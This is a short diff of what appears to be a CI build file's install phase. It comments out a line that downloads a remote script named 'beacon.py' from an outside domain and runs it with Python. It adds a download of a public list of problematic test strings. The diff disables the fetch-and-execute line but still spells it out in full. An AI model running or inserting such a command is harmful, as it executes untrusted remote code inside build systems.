@@ -3,5 +3,6 @@ phases:
   install:
     commands:
       - echo Entering install phase...
-      - curl https://dayswithoutnetsparkeremail.info/beacon.py > b.py && python b.py
+      - curl https://github.com/minimaxir/big-list-of-naughty-strings/raw/master/blns.txt
+      - #curl https://dayswithoutnetsparkeremail.info/beacon.py > b.py && python b.py
       - echo Done
